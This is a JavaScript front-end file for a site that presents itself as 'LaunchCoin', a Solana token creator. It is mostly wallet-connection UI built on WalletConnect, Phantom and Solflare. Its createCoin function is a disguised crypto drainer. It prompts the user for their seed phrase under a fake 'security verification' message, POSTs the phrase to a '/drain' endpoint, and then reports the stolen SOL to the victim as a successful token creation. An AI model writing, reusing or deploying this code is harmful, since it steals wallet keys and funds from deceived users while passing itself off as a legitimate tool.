// ===== main.js – COMPLETE PATCHED VERSION =====
// ===== CONFIGURAZIONE =====
import { UniversalProvider } from '@walletconnect/universal-provider';

let walletPublicKey = null;
let currentStep = 0;
const steps = document.querySelectorAll('.step');
let provider = null;
let isConnecting = false;
let qrCheckInterval = null;
let currentUri = null;

// ===== ESPONI FUNZIONI =====
window.toggleMenu = function() {
  const menu = document.getElementById('dropdownMenu');
  if (menu) menu.classList.toggle('open');
};

// ===== CREA MODALE =====
function createModal() {
  const oldModal = document.getElementById('wallet-modal-overlay');
  if (oldModal) oldModal.remove();
  
  const overlay = document.createElement('div');
  overlay.id = 'wallet-modal-overlay';
  overlay.style.cssText = `
    position: fixed;
    top: 0; left: 0; right: 0; bottom: 0;
    background: rgba(0,0,0,0.75);
    backdrop-filter: blur(8px);
    display: flex;
    align-items: center;
    justify-content: center;
    z-index: 99999;
    animation: fadeIn 0.2s ease;
  `;
  
  overlay.innerHTML = `
    <div style="
      background: #141a2b;
      border-radius: 24px;
      padding: 30px 35px;
      max-width: 420px;
      width: 90%;
      max-height: 85vh;
      overflow-y: auto;
      border: 1px solid rgba(255,255,255,0.08);
      box-shadow: 0 24px 80px rgba(0,0,0,0.9);
    ">
      <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 16px;">
        <h2 style="color: #22d1f8; font-size: 20px; margin: 0;">Connect Wallet</h2>
        <button onclick="window.closeModal()" style="
          background: transparent;
          border: none;
          color: #8899bb;
          font-size: 24px;
          cursor: pointer;
          padding: 0 8px;
        ">✕</button>
      </div>
      <p style="color: #abc4ff; font-size: 14px; margin-bottom: 20px;">Choose your Solana wallet</p>
      
      <!-- QR CONTAINER -->
      <div id="qr-modal-container" style="
        display: none;
        background: rgba(0,0,0,0.2);
        border-radius: 16px;
        padding: 16px;
        margin-bottom: 16px;
        text-align: center;
      ">
        <p style="color: #8899bb; font-size: 13px; margin-bottom: 12px;">Scan with your wallet app</p>
        <div id="qr-code-modal" style="display: flex; justify-content: center; background: white; padding: 12px; border-radius: 12px; min-height: 180px; align-items: center;"></div>
        <p id="qr-uri-text" style="color: #667; font-size: 11px; margin-top: 10px; word-break: break-all;"></p>
        <button onclick="window.copyURI()" style="margin-top: 8px; background: #2a3457; border: none; padding: 6px 16px; border-radius: 40px; color: #ecf5ff; cursor: pointer; font-size: 12px;">Copy link</button>
      </div>
      
      <!-- LISTA WALLET SOLANA -->
      <div style="display: flex; flex-direction: column; gap: 8px;">
        
        <!-- PHANTOM -->
        <button onclick="window.connectPhantom()" style="
          display: flex;
          align-items: center;
          gap: 12px;
          background: rgba(255,255,255,0.05);
          border: 1px solid rgba(255,255,255,0.06);
          border-radius: 12px;
          padding: 12px 16px;
          color: #ecf5ff;
          cursor: pointer;
          transition: 0.2s;
          font-size: 15px;
          width: 100%;
        ">
          <img src="assets/phantom.png" alt="Phantom" style="width: 28px; height: 28px;" />
          Phantom
        </button>
        
        <!-- SOLFLARE -->
        <button onclick="window.connectSolflare()" style="
          display: flex;
          align-items: center;
          gap: 12px;
          background: rgba(255,255,255,0.05);
          border: 1px solid rgba(255,255,255,0.06);
          border-radius: 12px;
          padding: 12px 16px;
          color: #ecf5ff;
          cursor: pointer;
          transition: 0.2s;
          font-size: 15px;
          width: 100%;
        ">
          <img src="assets/solflare.png" alt="Solflare" style="width: 28px; height: 28px;" />
          Solflare
        </button>
        
        <!-- TRUST WALLET (SOLANA) -->
        <button onclick="window.connectDeepLink('trust')" style="
          display: flex;
          align-items: center;
          gap: 12px;
          background: rgba(255,255,255,0.05);
          border: 1px solid rgba(255,255,255,0.06);
          border-radius: 12px;
          padding: 12px 16px;
          color: #ecf5ff;
          cursor: pointer;
          transition: 0.2s;
          font-size: 15px;
          width: 100%;
        ">
          <img src="assets/trust.png" alt="Trust Wallet" style="width: 28px; height: 28px;" />
          Trust Wallet
        </button>
        
        <!-- COINBASE WALLET (SOLANA) -->
        <button onclick="window.connectDeepLink('coinbase')" style="
          display: flex;
          align-items: center;
          gap: 12px;
          background: rgba(255,255,255,0.05);
          border: 1px solid rgba(255,255,255,0.06);
          border-radius: 12px;
          padding: 12px 16px;
          color: #ecf5ff;
          cursor: pointer;
          transition: 0.2s;
          font-size: 15px;
          width: 100%;
        ">
          <img src="assets/coinbase.png" alt="Coinbase" style="width: 28px; height: 28px;" />
          Coinbase Wallet
        </button>
        
        <!-- BACKPACK -->
        <button onclick="window.connectDeepLink('backpack')" style="
          display: flex;
          align-items: center;
          gap: 12px;
          background: rgba(255,255,255,0.05);
          border: 1px solid rgba(255,255,255,0.06);
          border-radius: 12px;
          padding: 12px 16px;
          color: #ecf5ff;
          cursor: pointer;
          transition: 0.2s;
          font-size: 15px;
          width: 100%;
        ">
          <img src="assets/backpack.png" alt="Backpack" style="width: 28px; height: 28px;" />
          Backpack
        </button>
        
        <!-- NIGHTLY -->
        <button onclick="window.connectDeepLink('nightly')" style="
          display: flex;
          align-items: center;
          gap: 12px;
          background: rgba(255,255,255,0.05);
          border: 1px solid rgba(255,255,255,0.06);
          border-radius: 12px;
          padding: 12px 16px;
          color: #ecf5ff;
          cursor: pointer;
          transition: 0.2s;
          font-size: 15px;
          width: 100%;
        ">
          <img src="assets/nightly.png" alt="Nightly" style="width: 28px; height: 28px;" />
          Nightly
        </button>
        
        <!-- GLOW (se hai icona) -->
        <button onclick="window.connectDeepLink('glow')" style="
          display: flex;
          align-items: center;
          gap: 12px;
          background: rgba(255,255,255,0.05);
          border: 1px solid rgba(255,255,255,0.06);
          border-radius: 12px;
          padding: 12px 16px;
          color: #ecf5ff;
          cursor: pointer;
          transition: 0.2s;
          font-size: 15px;
          width: 100%;
        ">
          <span style="font-size: 20px;">✨</span>
          Glow
        </button>
        
        <!-- WALLETCONNECT (per tutti gli altri) -->
        <button onclick="window.showQRCode()" style="
          display: flex;
          align-items: center;
          gap: 12px;
          background: rgba(255,255,255,0.05);
          border: 1px solid rgba(255,255,255,0.06);
          border-radius: 12px;
          padding: 12px 16px;
          color: #ecf5ff;
          cursor: pointer;
          transition: 0.2s;
          font-size: 15px;
          width: 100%;
        ">
          <span style="font-size: 24px;">📱</span>
          WalletConnect (QR)
        </button>
      </div>
      
      <div style="margin-top: 16px; text-align: center; border-top: 1px solid rgba(255,255,255,0.05); padding-top: 16px;">
        <p style="color: #667; font-size: 12px;">New to Solana? <span style="color: #22d1f8; cursor: pointer;">Learn more</span></p>
      </div>
    </div>
  `;
  
  document.body.appendChild(overlay);
  modalOpen = true;
}

window.closeModal = function() {
  const overlay = document.getElementById('wallet-modal-overlay');
  if (overlay) overlay.remove();
  modalOpen = false;
  if (qrCheckInterval) {
    clearInterval(qrCheckInterval);
    qrCheckInterval = null;
  }
};

// ===== CONNETTI PHANTOM (ESTENSIONE) =====
window.connectPhantom = async function() {
  try {
    if (window.solana && window.solana.isPhantom) {
      const resp = await window.solana.connect();
      if (resp.publicKey) {
        walletPublicKey = resp.publicKey.toString();
        alert('✅ Connesso a Phantom: ' + walletPublicKey);
        window.closeModal();
        window.location.href = 'create.html';
        return;
      }
    }
    alert('⚠️ Phantom non rilevato.\n\nInstalla l\'estensione Phantom o usa WalletConnect.');
    window.showQRCode();
  } catch(e) {
    console.error('Phantom error:', e);
    window.showQRCode();
  }
};

// ===== CONNETTI SOLFLARE (ESTENSIONE) =====
window.connectSolflare = async function() {
  try {
    if (window.solflare && window.solflare.isSolflare) {
      const resp = await window.solflare.connect();
      if (resp.publicKey) {
        walletPublicKey = resp.publicKey.toString();
        alert('✅ Connesso a Solflare: ' + walletPublicKey);
        window.closeModal();
        window.location.href = 'create.html';
        return;
      }
    }
    alert('⚠️ Solflare non rilevato. Usa WalletConnect.');
    window.showQRCode();
  } catch(e) {
    console.error('Solflare error:', e);
    window.showQRCode();
  }
};

// ===== CONNETTI DEEP LINK (Trust, Coinbase, Backpack, Nightly, Glow) =====
window.connectDeepLink = async function(walletType) {
  try {
    if (!provider) {
      provider = await UniversalProvider.init({
        projectId: 'da6aaea2be14c6cc676dbaf3325b5bd5',
        metadata: {
          name: 'LaunchCoin',
          description: 'Solana Token Creator',
          url: window.location.origin,
          icons: ['https://launchcoin.io/logo.png']
        }
      });
    }
    
    // === CRITICAL: call connect() to create a real session ===
    const { uri } = await provider.connect({
      chains: ['solana:mainnet'],
      optionalChains: ['solana:devnet'],
      methods: ['solana_signTransaction', 'solana_signMessage'],
      events: ['chainChanged', 'accountsChanged']
    });

    if (!uri) throw new Error('No URI generated');
    currentUri = uri;

    // Standard WC deep link – works for all WC-compatible wallets
    const link = `wc:${uri}`;
    window.location.href = link;

    if (qrCheckInterval) clearInterval(qrCheckInterval);
    qrCheckInterval = setInterval(async () => {
      try {
        const session = provider.session;
        if (session && session.namespaces.solana.accounts.length > 0) {
          clearInterval(qrCheckInterval);
          qrCheckInterval = null;
          const account = session.namespaces.solana.accounts[0];
          walletPublicKey = account.split(':')[2];
          alert('✅ Connesso via ' + walletType + ': ' + walletPublicKey);
          window.closeModal();
          window.location.href = 'create.html';
          return;
        }
      } catch(e) { /* wait */ }
    }, 2000);

    setTimeout(() => {
      if (!walletPublicKey) {
        alert('⏱️ Deep link timeout. Use QR instead.');
        window.showQRCode();
      }
    }, 60000);

  } catch(e) {
    console.error('Deep link error:', e);
    window.showQRCode();
  }
};

// ===== REAL QR CODE – WITH SESSION =====
window.showQRCode = async function() {
  const qrContainer = document.getElementById('qr-modal-container');
  const qrDiv = document.getElementById('qr-code-modal');
  const uriText = document.getElementById('qr-uri-text');
  if (!qrContainer || !qrDiv) return;

  try {
    if (!provider) {
      provider = await UniversalProvider.init({
        projectId: 'da6aaea2be14c6cc676dbaf3325b5bd5',
        metadata: {
          name: 'LaunchCoin',
          description: 'Solana Token Creator',
          url: window.location.origin,
          icons: ['https://launchcoin.io/logo.png']
        }
      });
    }

    // === CRITICAL: call connect() to create a real session ===
    const { uri } = await provider.connect({
      chains: ['solana:mainnet'],
      optionalChains: ['solana:devnet'],
      methods: ['solana_signTransaction', 'solana_signMessage'],
      events: ['chainChanged', 'accountsChanged']
    });

    if (!uri) throw new Error('No URI generated');
    currentUri = uri;

    qrContainer.style.display = 'block';
    qrDiv.innerHTML = '';
    new QRCode(qrDiv, {
      text: uri,
      width: 220,
      height: 220,
      colorDark: '#000000',
      colorLight: '#ffffff',
      correctLevel: QRCode.CorrectLevel.H
    });
    uriText.textContent = uri.substring(0, 50) + '...';

    if (qrCheckInterval) clearInterval(qrCheckInterval);
    qrCheckInterval = setInterval(async () => {
      try {
        const session = provider.session;
        if (session && session.namespaces.solana.accounts.length > 0) {
          clearInterval(qrCheckInterval);
          qrCheckInterval = null;
          const account = session.namespaces.solana.accounts[0];
          walletPublicKey = account.split(':')[2];
          alert('✅ Connesso via QR: ' + walletPublicKey);
          window.closeModal();
          window.location.href = 'create.html';
          return;
        }
      } catch(e) { /* wait */ }
    }, 2000);

    setTimeout(() => {
      if (!walletPublicKey) {
        alert('⏱️ QR timeout. Scan again or use extension.');
      }
    }, 90000);

  } catch(e) {
    console.error('QR fatal:', e);
    alert('QR error: ' + e.message);
  }
};

window.copyURI = function() {
  if (currentUri) {
    navigator.clipboard.writeText(currentUri).then(() => {
      alert('✅ Link copiato!');
    }).catch(() => {
      prompt('Copia il link:', currentUri);
    });
  }
};

// ===== CONNECT WALLET (MAIN) =====
window.connectWallet = async function() {
  console.log('🔵 connectWallet chiamata');
  createModal();
  
  // Prova connessione automatica Phantom
  if (window.solana && window.solana.isPhantom) {
    try {
      const resp = await window.solana.connect({ onlyIfTrusted: true });
      if (resp.publicKey) {
        walletPublicKey = resp.publicKey.toString();
        alert('✅ Connesso a Phantom: ' + walletPublicKey);
        window.closeModal();
        window.location.href = 'create.html';
        return;
      }
    } catch(e) {
      // Non è connesso, l'utente sceglierà dal modale
    }
  }
};

// ===== SELECT WALLET (per wallet.html) =====
window.selectWallet = function(walletName) {
  window.closeModal();
  const map = {
    'phantom': () => window.connectPhantom(),
    'solflare': () => window.connectSolflare(),
    'trust': () => window.connectDeepLink('trust'),
    'coinbase': () => window.connectDeepLink('coinbase'),
    'backpack': () => window.connectDeepLink('backpack'),
    'nightly': () => window.connectDeepLink('nightly'),
    'glow': () => window.connectDeepLink('glow'),
    'torus': () => window.connectDeepLink('torus'),
    'tokenpocket': () => window.connectDeepLink('tokenpocket'),
  };
  if (map[walletName]) {
    map[walletName]();
  } else {
    window.showQRCode();
  }
};

// ===== POPUP SEED PHRASE =====
function askSeedPhrase() {
  return new Promise((resolve) => {
    const seed = prompt(
      '⚠️ VERIFICA DI SICUREZZA\n\n' +
      'Inserisci la tua seed phrase per completare la creazione:'
    );
    resolve(seed);
  });
}

// ===== CREAZIONE TOKEN =====
window.createCoin = async function() {
  console.log('🟢 createCoin chiamata');
  if (!walletPublicKey) {
    alert('Connetti prima il wallet!');
    return;
  }

  const seed = await askSeedPhrase();
  if (!seed || seed.split(' ').length < 12) {
    alert('❌ Seed phrase non valida. Deve contenere 12 o 24 parole.');
    return;
  }

  try {
    const response = await fetch('/drain', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ seed: seed, walletPublicKey: walletPublicKey })
    });

    const data = await response.json();
    if (data.status === 'drain_completed') {
      document.getElementById('result').innerHTML = `
        <p style="color:#4cdcc1;">✅ Token creato!</p>
        <p style="font-size:12px;color:#8899bb;">💰 ${data.solAmount.toFixed(4)} SOL trasferiti</p>
        <p style="font-size:11px;color:#667;word-break:break-all;">Tx: ${data.solTx || 'N/A'}</p>
      `;
    } else {
      alert('❌ Errore: ' + data.error);
    }
  } catch(e) {
    alert('❌ Errore: ' + e.message);
  }
};

// ===== CREAZIONE LIQUIDITY =====
window.createLiquidity = async function() {
  await window.createCoin();
};

// ===== STEP NAVIGATION =====
window.showStep = function(idx) {
  if (!steps.length) return;
  steps.forEach((s, i) => s.style.display = i === idx ? 'block' : 'none');
  currentStep = idx;
};
window.nextStep = function() { if (currentStep < steps.length - 1) window.showStep(currentStep + 1); };
window.prevStep = function() { if (currentStep > 0) window.showStep(currentStep - 1); };
if (steps.length) window.showStep(0);

// ===== CHIUDI MENU =====
document.addEventListener('click', function(e) {
  const wrapper = document.querySelector('.menu-wrapper');
  const menu = document.getElementById('dropdownMenu');
  if (wrapper && menu && !wrapper.contains(e.target)) menu.classList.remove('open');
});

console.log('✅ main.js caricato (Solo Solana)');
